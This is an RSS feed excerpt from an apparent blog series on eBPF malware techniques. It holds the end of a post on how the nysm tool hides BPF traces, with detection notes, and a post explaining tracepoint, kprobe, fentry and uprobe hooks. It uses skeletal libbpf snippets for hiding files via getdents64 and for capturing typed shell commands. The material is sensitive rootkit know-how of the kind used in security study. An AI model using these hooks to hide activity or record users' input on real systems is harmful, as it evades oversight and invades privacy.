</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_probe_write_user</span>(<span style="color:#f92672">&amp;</span>uattr_ptr<span style="color:#f92672">-&gt;</span>next_id, <span style="color:#f92672">&amp;</span>id, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint32_t</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Overwriting <em>next_id</em> Value<br><br></span>
<h3 id="45-demo">4.5 Demo</h3>
<video width=100% controls>
    <source src="/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-3-hiding-bpf-traces/videos/nysm-demo.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>
<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video"><em>nysm</em> Demo<br><br></span>
<h2 id="5-detection">5. Detection</h2>
<p>Even though <em>nysm</em> was very well written, warning messages for <em>bpf_probe_write_user</em> will flood the kernel logs!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo dmesg
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 8366.391364<span style="color:#f92672">]</span> nysm<span style="color:#f92672">[</span>10466<span style="color:#f92672">]</span> is installing a program with bpf_probe_write_user helper that may corrupt user memory!
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Kernel Logs Showing Warning Messages on <em>bpf_probe_write_user()</em> Usage<br><br></span>
<p>Any EDR / SIEM that monitors these logs will definitely flag this out and serve as a pivot point for Blue Teams to do their threat hunting and forensics.</p>
<h2 id="6-conclusion">6. Conclusion</h2>
<p>By hooking into just a few strategic syscalls and keeping track of what belongs to it, <em>nysm</em> manages to fool userland tools and blend into the kernel like a ghost. This kind of behavior isn’t just useful for malware, but also shows just how powerful (and dangerous) eBPF can be when used creatively.</p>
<p>However, there are limitations to <em>nysm&rsquo;s</em> capabilities such as the inability to suppress warning messages in the kernel logs.</p>
<p>In the next part of the series, we will explore on some common techniques used to hide processes. In the meantime, I highly encourage you to look through the <em>nysm</em> repository source code for yourself to deepen your understanding. That&rsquo;s all folks! Till next time&hellip;</p>
]]></content>
        </item>
        
        <item>
            <title>eBPF Malware Techniques Part 2 - Setting Appropriate Hooks</title>
            <link>https://mathscantor.github.io/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-2-setting-appropriate-hooks/</link>
            <pubDate>Fri, 11 Apr 2025 23:42:35 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-2-setting-appropriate-hooks/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;In my previous post, you were introduced to the 3 different major frameworks that eBPFs have to offer. I also briefly talked about how the logic of its hooks.&lt;/p&gt;
&lt;p&gt;To begin crafting your own eBPF-based malware, you need to understand where and what to hook on to. You don’t just throw an eBPF program into the void and hope it latches onto something juicy. No — you need a plan, a strategy, and most importantly, knowledge of the landscape.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>In my previous post, you were introduced to the 3 different major frameworks that eBPFs have to offer. I also briefly talked about how the logic of its hooks.</p>
<p>To begin crafting your own eBPF-based malware, you need to understand where and what to hook on to. You don’t just throw an eBPF program into the void and hope it latches onto something juicy. No — you need a plan, a strategy, and most importantly, knowledge of the landscape.</p>
<p>Thus, today’s focus will be on understanding the different types of hooks available, and when to use each to best achieve your goals:</p>
<ol>
<li><em>tracepoints</em>,</li>
<li><em>kprobe</em> / <em>kretprobe</em></li>
<li><em>fentry</em> / <em>fexit</em></li>
<li><em>uprobe</em> / <em>uretprobe</em></li>
</ol>
<p>Also, this part of the walkthrough will be purely based on the <em>libbpf</em> framework with snippets taken from <a href="https://github.com/libbpf/libbpf-bootstrap">libbpf-bootstrap</a> and <a href="https://github.com/iovisor/bcc/tree/master/libbpf-tools">bcc/libbpf-tools</a>.</p>
<h2 id="2-tracepoints">2. Tracepoints</h2>
<p>A tracepoint is a statically defined hook embedded within the Linux kernel. These are intentionally placed by kernel developers to expose important events or state changes — such as when a syscall is entered or exited, a scheduler event occurs, or memory is allocated.</p>
<p>Each tracepoint has a stable name, a well-defined structure, and exposes typed arguments that your eBPF programs can read. This makes them incredibly useful for observability and introspection.</p>
<h3 id="21-checking-available-tracepoints">2.1 Checking Available Tracepoints</h3>
<p>A great starting point is to look at <em>/sys/kernel/debug/tracing/available_events</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat /sys/kernel/debug/tracing/available_events
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>sched:sched_prepare_exec
</span></span><span style="display:flex;"><span>sched:sched_process_exec
</span></span><span style="display:flex;"><span>sched:sched_process_fork
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>syscalls:sys_exit_openat
</span></span><span style="display:flex;"><span>syscalls:sys_enter_openat
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Checking for Available Tracepoints<br><br></span>
<p>This command prints out all <em>tracepoints</em> currently available in your kernel. It&rsquo;s basically a buffet of potential targets. You’ll see categories like <em>syscalls</em>, <em>irq</em>, <em>sched</em>, <em>kmem</em>, and more.</p>
<p>If your goal is to monitor or manipulate user-level process behavior, the syscall <em>tracepoints</em> are particularly juicy. Why is this so? Let&rsquo;s take a look at a simple example of the <em>ls</em> process with <em>strace</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strace ls
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;.&#34;</span>, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>fstat<span style="color:#f92672">(</span>3, <span style="color:#f92672">{</span>st_mode<span style="color:#f92672">=</span>S_IFDIR|0750, st_size<span style="color:#f92672">=</span>798, ...<span style="color:#f92672">})</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>getdents64<span style="color:#f92672">(</span>3, 0x557cefd81710 /* <span style="color:#ae81ff">46</span> entries */, 32768<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1496</span>
</span></span><span style="display:flex;"><span>getdents64<span style="color:#f92672">(</span>3, 0x557cefd81710 /* <span style="color:#ae81ff">0</span> entries */, 32768<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>close<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Truncated Output of Strace on <em>ls</em> Process<br><br></span>
<p>We can see that the <em>ls</em> process is using the <em>getdents64</em> syscall for directory listing. If your goal was to hide certain files/directories, then you will have to target <code>syscalls:sys_enter_getdents64</code> and <code>syscalls:sys_exit_getdents64</code>. (Further exploration done in later part of this series)</p>
<p>Using the <em>libbpf</em> framework, your hookpoint will look something similar to this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tp/syscalls/sys_enter_getdents64&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">handle_getdents_enter</span>(<span style="color:#66d9ef">struct</span> trace_event_raw_sys_enter <span style="color:#f92672">*</span>ctx) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tp/syscalls/sys_exit_getdents64&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">handle_getdents_exit</span>(<span style="color:#66d9ef">struct</span> trace_event_raw_sys_exit <span style="color:#f92672">*</span>ctx) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Example of <em>getdents64</em> Hooks<br><br></span>
<h3 id="22-understanding-tracepoint-args">2.2 Understanding Tracepoint Args</h3>
<p>Each tracepoint has its arguments format stored in the following format:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/sys/kernel/debug/tracing/events/&lt;tp_type&gt;/&lt;tp_name&gt;/format
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Tracepoint Format Path<br><br></span>
<p>To illustrate this, I am using back <code>syscalls:sys_enter_getdents64</code> as my example.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_getdents64/format
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>name: sys_enter_getdents64
</span></span><span style="display:flex;"><span>ID: <span style="color:#ae81ff">908</span>
</span></span><span style="display:flex;"><span>format:
</span></span><span style="display:flex;"><span>	field:unsigned short common_type;	offset:0;	size:2;	signed:0;
</span></span><span style="display:flex;"><span>	field:unsigned char common_flags;	offset:2;	size:1;	signed:0;
</span></span><span style="display:flex;"><span>	field:unsigned char common_preempt_count;	offset:3;	size:1;	signed:0;
</span></span><span style="display:flex;"><span>	field:int common_pid;	offset:4;	size:4;	signed:1;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	field:int __syscall_nr;	offset:8;	size:4;	signed:1;
</span></span><span style="display:flex;"><span>	field:unsigned int fd;	offset:16;	size:8;	signed:0;
</span></span><span style="display:flex;"><span>	field:struct linux_dirent64 * dirent;	offset:24;	size:8;	signed:0;
</span></span><span style="display:flex;"><span>	field:unsigned int count;	offset:32;	size:8;	signed:0;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print fmt: <span style="color:#e6db74">&#34;fd: 0x%08lx, dirent: 0x%08lx, count: 0x%08lx&#34;</span>, <span style="color:#f92672">((</span>unsigned long<span style="color:#f92672">)(</span>REC-&gt;fd<span style="color:#f92672">))</span>, <span style="color:#f92672">((</span>unsigned long<span style="color:#f92672">)(</span>REC-&gt;dirent<span style="color:#f92672">))</span>, <span style="color:#f92672">((</span>unsigned long<span style="color:#f92672">)(</span>REC-&gt;count<span style="color:#f92672">))</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Format of syscalls:sys_enter_getdents64<br><br></span>
<p>The first argument of the <em>getdents64</em> syscall only starts after <code>int __syscall_nr</code>. So essentially, we are really only concerned with the following syscall parameters:</p>
<ol>
<li><code>unsigned int fd</code> – The file descriptor for the directory being read</li>
<li><code>struct linux_dirent64 *dirent</code> – A pointer to the buffer where directory entries will be stored</li>
<li><code>int count</code> – The maximum number of bytes to read into the buffer</li>
</ol>
<p>These arguments are passed to the tracepoint handler and can be accessed in your eBPF program via the <code>args</code> array of the <code>trace_event_raw_sys_enter</code> struct.</p>
<p>That’s why, when writing your eBPF handler for this tracepoint, it may look something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tp/syscalls/sys_enter_getdents64&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">handle_getdents_enter</span>(<span style="color:#66d9ef">struct</span> trace_event_raw_sys_enter <span style="color:#f92672">*</span>ctx) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> ctx<span style="color:#f92672">-&gt;</span>args[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>dirent <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>)ctx<span style="color:#f92672">-&gt;</span>args[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count <span style="color:#f92672">=</span> ctx<span style="color:#f92672">-&gt;</span>args[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Accessing Arguments Through <em>trace_event_raw_sys_enter</em> Struct<br><br></span>
<p>Alternatively, you can also define your own struct for cleaner argument access:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Self-Defined Struct
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> sys_enter_getdents64_format {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> h;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int32_t</span> __syscall_nr;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> fd;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>dirent;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> count;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tp/syscalls/sys_enter_getdents64&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">handle_getdents_enter</span>(<span style="color:#66d9ef">struct</span> sys_enter_getdents64_format <span style="color:#f92672">*</span>format) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> fd <span style="color:#f92672">=</span> format<span style="color:#f92672">-&gt;</span>fd;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>dirent <span style="color:#f92672">=</span> format<span style="color:#f92672">-&gt;</span>dirent;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> count <span style="color:#f92672">=</span> format<span style="color:#f92672">-&gt;</span>count;
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Accessing Arguments Through Self-Defined Struct<br><br></span>
<h2 id="3-kprobe--kretprobe">3. Kprobe / Kretprobe</h2>
<p>So far, we&rsquo;ve explored <em>tracepoints</em> — stable and well-documented hooks that expose syscall arguments cleanly. But what if you want more power or need to hook internal kernel functions that don’t have <em>tracepoints</em>? This is where <em>kprobes</em> come in.</p>
<p>A <em>kprobe</em> lets you dynamically instrument almost any kernel function — not just syscalls or tracepoints. When that function is called, your <em>kprobe</em> hook gets executed right at the start (before the actual function logic runs).</p>
<p>A <em>kretprobe</em> is its sibling: it runs after the kernel function finishes executing, giving you access to the return value.</p>
<h3 id="31-checking-available-kprobes">3.1 Checking Available Kprobes</h3>
<p>The good news is — the kernel exposes a full list of available <em>kprobe</em> targets through the ftrace interface. Just run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat /sys/kernel/debug/tracing/available_filter_functions
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Listing Available Kprobe Targets<br><br></span>
<p>This will spit out thousands of functions, all which are fair game for <em>kprobes</em>, assuming your kernel was built with <em>CONFIG_KPROBES</em> and BPF support.</p>
<p>For example, to find file deletion logic, you might want to search for functions that contain the &ldquo;unlinkat&rdquo; substring:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ grep -i unlink /sys/kernel/debug/tracing/available_filter_functions
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>vfs_unlink
</span></span><span style="display:flex;"><span>do_unlinkat
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Listing Kprobe Targets Related to File Deletion<br><br></span>
<h3 id="32-understanding-kprobe-args">3.2 Understanding Kprobe Args</h3>
<p>In order to start writing out eBPF <em>kprobe</em> hooks, we need to identify the function prototype / definition of our <em>kprobe</em> target from the <a href="https://github.com/torvalds/linux">kernel source</a>.</p>
<p>Using <code>do_unlinkat</code> as an example, its function prototype is found in &ldquo;<em>fs/internal.h</em>&rdquo;.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">do_unlinkat</span>(<span style="color:#66d9ef">int</span> dfd, <span style="color:#66d9ef">struct</span> filename <span style="color:#f92672">*</span>name);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Function Prototype of <em>do_unlinkat()</em><br><br></span>
<p>And with that, we are able to write our <em>kprobe</em> / <em>kretprobe</em> hook pairs as such:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;kprobe/do_unlinkat&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">BPF_KPROBE</span>(do_unlinkat_entry, <span style="color:#66d9ef">int</span> dfd, <span style="color:#66d9ef">struct</span> filename <span style="color:#f92672">*</span>name) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;kretprobe/do_unlinkat&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">BPF_KRETPROBE</span>(do_unlinkat_exit, <span style="color:#66d9ef">long</span> ret) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Example of Kprobe/Kretprobe on <em>do_unlinkat()</em><br><br></span>
<p><em>BPF_KPROBE</em> is actually a macro that simplifies defining the function signature for a <em>kprobe</em>, by defining the lower-level <code>struct pt_regs *ctx</code> so you don’t have to manually extract arguments from CPU registers.</p>
<p>This macro is defined in &ldquo;<em>bpf_tracing.h</em>&rdquo;, which is generated during the build process (typically src/.output/bpf/bpf_tracing.h or a similar path, depending on your setup).</p>
<p>The macro expects two parts:</p>
<ol>
<li>The first argument is your handler function name — this can be anything you choose, as long as it matches the function signature.</li>
<li>The following arguments must match the parameters of the kernel function you&rsquo;re hooking onto.</li>
</ol>
<h2 id="4-fentry--fexit">4. Fentry / Fexit</h2>
<p>Now that you’ve seen how to use kprobes and kretprobes, let’s talk about their modern, more efficient cousins: fentry and fexit.</p>
<blockquote>
<p><a href="https://docs.ebpf.io/linux/program-type/BPF_PROG_TYPE_TRACING/#fentry">Fentry eBPF Docs</a>:</p>
<ul>
<li>Fentry programs are similar in function to a kprobe attached to a functions first instruction. This program type is invoked before control passes to the function to allow for tracing/observation.</li>
<li>Kprobes do not have to be attached at the entry point of a function, kprobes can be installed at any point in the function, whereas fentry programs are always attached at the entry point of a function.</li>
<li>Fentry programs are attached using a BPF trampoline which causes less overhead than kprobes</li>
</ul>
</blockquote>
<p>If you’re targeting a kernel function like <em>do_unlinkat()</em>, you can hook onto it using <em>fentry</em> (which runs at function entry) and <em>fexit</em> (which runs at function return) — just like <em>kprobe</em> and <em>kretprobe</em>.</p>
<p>Here’s what that looks like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;fentry/do_unlinkat&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">BPF_PROG</span>(do_unlinkat_entry, <span style="color:#66d9ef">int</span> dfd, <span style="color:#66d9ef">struct</span> filename <span style="color:#f92672">*</span>name) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;fexit/do_unlinkat&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">BPF_PROG</span>(do_unlinkat_exit, <span style="color:#66d9ef">int</span> dfd, <span style="color:#66d9ef">struct</span> filename <span style="color:#f92672">*</span>name, <span style="color:#66d9ef">long</span> ret) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Example of Fentry/Fexit on <em>do_unlinkat()</em><br><br></span>
<p>There are lots of similarities to <em>kprobes</em>, the only difference being the macro and the function exit handler&rsquo;s arguments. Instead of <em>BPF_KPROBE</em>, we have to use <em>BPF_PROG</em> which is designed for <em>fentry</em>, <em>fexit</em> and BTF-enabled tracepoints (not covered in this series).</p>
<p>It does the same convenience wrapping — but this time around an <code>unsigned long long *ctx</code> argument, which holds the function arguments as a generic array. Again, you write the function prototype as if you&rsquo;re calling the real kernel function, and the macro handles the underlying casting.</p>
<h2 id="5-uprobe--uretprobe">5. Uprobe &amp; Uretprobe</h2>
<p>So far, we&rsquo;ve mainly explored kernel-space hooks — tracing functions inside the Linux kernel using <em>tracepoints</em>, <em>kprobe</em>/<em>kretprobe</em>, <em>fentry</em>/<em>fexit</em>. But, what if you want to observe user-space applications instead?</p>
<p>That’s where <em>uprobe</em> and <em>uretprobe</em> come in.</p>
<p><em>Uprobes</em> allow you to hook onto the entry and exit of user-space functions — much like <em>kprobes</em>, but for binaries like <em>/usr/bin/bash</em> or shared libraries like <em>/lib64/libc.so.6</em>. This is incredibly useful for directly messing around with user-space applications. You may think of this as <em>ptrace</em> on steroids as this <em>uprobes</em> can apply to all processes, including new ones that either run the binary or calls the target function from the shared library.</p>
<p>A classic example is <em>bashreadline</em> — where we trace user-entered shell commands by hooking onto the readline() function, which is used by interactive shells to read user input.</p>
<p>A full example of this can be found in the <a href="https://github.com/iovisor/bcc/tree/master/libbpf-tools">libbpf-tools</a> <em>bashreadline</em> program from the iovisor repository. As the example they provided only showed the usage of <em>uretprobe</em>, I have taken the liberty to show you what it will look like if you included a <em>uprobe</em> for it.</p>
<p>At a glance, a simplified version of what these hooks look like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;uprobe&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">BPF_UPROBE</span>(printline, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>prompt) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;uretprobe&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">BPF_URETPROBE</span>(printret, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ret) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Example of uprobe/uretprobe<br><br></span>
<p>In the original libbpf-tools example, you’ll notice that the program uses slightly more descriptive section names like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;uretprobe/readline&#34;</span>)
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Bashreadline Original Section Header<br><br></span>
<p>But this is purely a naming convention for clarity! The section string could be just <code>SEC(&quot;uretprobe&quot;)</code> or <code>SEC(&quot;uprobe&quot;)</code> — the real magic happens at attach time, when you tell the kernel which binary and which offset to monitor.</p>
<p>This is usually done by using a helper function to resolve the function’s offset inside the ELF binary — for example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>func_off <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_elf_func_offset</span>(readline_so_path, 
</span></span><span style="display:flex;"><span>                   <span style="color:#a6e22e">find_readline_function_name</span>(readline_so_path));
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Getting Function Offset of <em>readline()</em> / <em>internal_readline_teardown()</em>&quot;<br><br></span>
<p>And then attach our <em>uprobe</em> and <em>uretprobe</em> like so:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>obj<span style="color:#f92672">-&gt;</span>links.printline <span style="color:#f92672">=</span> <span style="color:#a6e22e">bpf_program__attach_uprobe</span>(obj<span style="color:#f92672">-&gt;</span>progs.printline, 
</span></span><span style="display:flex;"><span>                      false,  <span style="color:#75715e">// false = uprobe (function entry)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                      <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,     <span style="color:#75715e">// -1 = all processes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                      readline_so_path, func_off);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>obj<span style="color:#f92672">-&gt;</span>links.printret <span style="color:#f92672">=</span> <span style="color:#a6e22e">bpf_program__attach_uprobe</span>(obj<span style="color:#f92672">-&gt;</span>progs.printret, 
</span></span><span style="display:flex;"><span>                      true,  <span style="color:#75715e">// true = uretprobe (function exit)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                      <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,    <span style="color:#75715e">// all processes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                      readline_so_path, func_off);
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Getting Function Offset of <em>readline()</em> / <em>internal_readline_teardown()</em>&quot;<br><br></span>
<p>So even though your <em>SEC()</em> string might look like &ldquo;uretprobe/readline&rdquo;, it’s the <em>bpf_program__attach_uprobe()</em> call that actually binds the hook to a specific binary and offset — not the section name.</p>
<p>This separation makes the program more reusable and modular. You could write a single generic uprobe BPF program, and at runtime attach it to any ELF function in any user-space binary, as long as you know its offset.</p>
